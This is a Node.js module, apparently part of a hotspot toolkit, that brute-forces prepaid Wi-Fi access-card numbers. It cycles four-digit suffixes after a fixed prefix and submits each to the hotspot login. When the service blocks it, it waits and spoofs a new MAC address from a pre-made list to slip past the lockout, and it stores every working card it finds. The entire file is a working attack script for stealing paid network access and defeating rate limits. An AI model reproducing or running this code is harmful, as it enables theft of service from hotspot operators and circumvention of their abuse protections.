const logger = require('../utils/logger');
const hotspotAuth = require('./hotspot-auth');
const sessionStore = require('./session-store');
const wifiManager = require('./wifi-manager');
const config = require('../../config/default.json');

const TRY_LIMIT = config.hotspot.tryCount || 20;
const BLOCK_MINUTES = config.hotspot.blockTime || 1;
const ATTEMPTS_BEFORE_BLOCK = Math.min(TRY_LIMIT - 2, 15);

let bruteForceState = {
  running: false,
  prefix: '262277',
  rangeStart: 0,
  rangeEnd: 9999,
  current: 0,
  found: 0,
  totalTested: 0,
  lastError: null,
  startTime: null,
  paused: false,
  blockedUntil: null,
  blockCount: 0,
  speed: 0,
  useMacRotation: true,
};

let bruteTimer = null;
let macIndex = 0;

const PRE_MADE_MACS = [
  '00:1A:2B:10:00:01', '00:1A:2B:10:00:02', '00:1A:2B:10:00:03',
  '00:1A:2B:10:00:04', '00:1A:2B:10:00:05', '00:1A:2B:10:00:06',
  '00:1A:2B:10:00:07', '00:1A:2B:10:00:08', '00:1A:2B:10:00:09',
  '00:1A:2B:10:00:0A', '00:1A:2B:10:00:0B', '00:1A:2B:10:00:0C',
  '00:1A:2B:10:00:0D', '00:1A:2B:10:00:0E', '00:1A:2B:10:00:0F',
  '00:1A:2B:10:00:10', '00:1A:2B:10:00:11', '00:1A:2B:10:00:12',
  '00:1A:2B:10:00:13', '00:1A:2B:10:00:14',
];

async function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function testCard(number, domain) {
  logger.debug(`Testing card: ${number}`);
  const result = await hotspotAuth.login(number, domain);
  if (result.isSuccess) {
    return { valid: true, number, domain, data: result.value };
  }

  if (result.statusCode === 403) {
    return { valid: false, blocked: true, number };
  }

  return { valid: false, number, error: result.error };
}

async function rotateMacForBrute() {
  if (!bruteForceState.useMacRotation) return;
  try {
    const mac = PRE_MADE_MACS[macIndex % PRE_MADE_MACS.length];
    macIndex++;
    await wifiManager.spoofMac(mac);
    await sleep(3000);
    logger.info(`Brute force MAC rotated to ${mac}`);
  } catch (err) {
    logger.warn('MAC rotation during brute force failed', err.message);
  }
}

const cardBruteForce = {
  start(options = {}) {
    if (bruteForceState.running) {
      return { isSuccess: false, value: null, error: 'Already running', statusCode: 409 };
    }

    bruteForceState = {
      ...bruteForceState,
      running: true,
      prefix: options.prefix || '262277',
      rangeStart: options.rangeStart || 0,
      rangeEnd: options.rangeEnd || 9999,
      current: options.rangeStart || 0,
      found: 0,
      totalTested: 0,
      lastError: null,
      startTime: new Date().toISOString(),
      paused: false,
      blockedUntil: null,
      blockCount: 0,
      speed: 0,
      useMacRotation: options.useMacRotation !== false,
    };

    logger.info(`Brute force started: ${bruteForceState.prefix}[${bruteForceState.rangeStart}-${bruteForceState.rangeEnd}]`);

    process.nextTick(() => runBatch());

    return { isSuccess: true, value: { state: { ...bruteForceState } }, error: null, statusCode: 200 };
  },

  pause() {
    bruteForceState.paused = true;
    logger.info('Brute force paused');
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },

  resume() {
    bruteForceState.paused = false;
    bruteForceState.lastError = null;
    logger.info('Brute force resumed');
    if (bruteForceState.running) {
      process.nextTick(() => runBatch());
    }
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },

  stop() {
    bruteForceState.running = false;
    bruteForceState.paused = false;
    if (bruteTimer) {
      clearTimeout(bruteTimer);
      bruteTimer = null;
    }
    logger.info(`Brute force stopped. Tested: ${bruteForceState.totalTested}, Found: ${bruteForceState.found}`);
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },

  getState() {
    const running = bruteForceState.running;
    const elapsed = bruteForceState.startTime
      ? (Date.now() - new Date(bruteForceState.startTime).getTime()) / 1000
      : 0;
    const speed = elapsed > 0 ? bruteForceState.totalTested / elapsed : 0;

    const totalRange = bruteForceState.rangeEnd - bruteForceState.rangeStart + 1;
    const progress = totalRange > 0 ? ((bruteForceState.current - bruteForceState.rangeStart) / totalRange) * 100 : 0;

    return {
      running,
      paused: bruteForceState.paused,
      prefix: bruteForceState.prefix,
      current: bruteForceState.current,
      rangeStart: bruteForceState.rangeStart,
      rangeEnd: bruteForceState.rangeEnd,
      totalTested: bruteForceState.totalTested,
      found: bruteForceState.found,
      progress: Math.min(progress, 100).toFixed(1),
      speed: speed.toFixed(1),
      elapsed: Math.floor(elapsed),
      estimatedRemaining: speed > 0 ? ((totalRange - bruteForceState.totalTested) / speed) : 0,
      blockedUntil: bruteForceState.blockedUntil,
      blockCount: bruteForceState.blockCount,
      blocksRemaining: bruteForceState.blockedUntil
        ? Math.max(0, Math.ceil((new Date(bruteForceState.blockedUntil).getTime() - Date.now()) / 1000))
        : 0,
    };
  },

  addFoundCard(number, domain) {
    const exists = sessionStore.getCards().find(c => c.number === number);
    if (!exists) {
      sessionStore.addCard({ number, domain: domain || '1024K/2048K', profile: 'متوسطة' });
      bruteForceState.found++;
      sessionStore.addHistoryEntry({
        type: 'bruteforce_found',
        cardNumber: number.slice(-4),
        domain: domain || '1024K/2048K',
      });
      logger.info(`VALID CARD FOUND: ${number}`);
    }
  },

  clearState() {
    bruteForceState = {
      running: false, prefix: '262277', rangeStart: 0, rangeEnd: 9999,
      current: 0, found: 0, totalTested: 0, lastError: null,
      startTime: null, paused: false, blockedUntil: null, blockCount: 0,
      speed: 0, useMacRotation: true,
    };
    return { isSuccess: true, value: null, error: null, statusCode: 200 };
  },
};

async function runBatch() {
  if (bruteTimer) {
    clearTimeout(bruteTimer);
    bruteTimer = null;
  }

  if (!bruteForceState.running || bruteForceState.paused) return;

  if (bruteForceState.blockedUntil) {
    const blockEnd = new Date(bruteForceState.blockedUntil).getTime();
    if (Date.now() < blockEnd) {
      const waitMs = blockEnd - Date.now() + 500;
      logger.info(`Blocked - waiting ${Math.ceil(waitMs / 1000)}s (attempt ${bruteForceState.blockCount})`);
      bruteTimer = setTimeout(runBatch, Math.min(waitMs, 60000));
      return;
    }
    bruteForceState.blockedUntil = null;
  }

  const batchSize = 1;
  let testedInBatch = 0;

  for (let i = 0; i < batchSize; i++) {
    if (!bruteForceState.running || bruteForceState.paused) return;

    if (bruteForceState.current > bruteForceState.rangeEnd) {
      logger.info('Brute force range completed');
      bruteForceState.running = false;
      return;
    }

    const cardNumber = `${bruteForceState.prefix}${String(bruteForceState.current).padStart(4, '0')}`;
    bruteForceState.current++;

    try {
      const result = await testCard(cardNumber, '1024K/2048K');
      bruteForceState.totalTested++;

      if (result.valid) {
        cardBruteForce.addFoundCard(cardNumber, '1024K/2048K');
        await sleep(2000);
      } else if (result.blocked) {
        bruteForceState.blockCount++;
        const blockDurationMs = BLOCK_MINUTES * 60 * 1000;
        bruteForceState.blockedUntil = new Date(Date.now() + blockDurationMs).toISOString();

        logger.warn(`Blocked after ${bruteForceState.totalTested} attempts. Cooling ${BLOCK_MINUTES}min`);

        if (bruteForceState.useMacRotation && bruteForceState.blockCount <= 3) {
          await rotateMacForBrute();
        }

        bruteTimer = setTimeout(runBatch, blockDurationMs + 2000);
        return;
      } else {
        await sleep(1500);
      }

      testedInBatch++;
    } catch (err) {
      logger.error('Brute force test error', err.message);
      await sleep(5000);
    }

    if (bruteForceState.totalTested % 5 === 0) {
      logger.info(`Brute force progress: ${bruteForceState.totalTested} tested, ${bruteForceState.found} found`);
    }
  }

  if (bruteForceState.running && !bruteForceState.paused) {
    bruteTimer = setTimeout(runBatch, 500);
  }
}

module.exports = cardBruteForce;
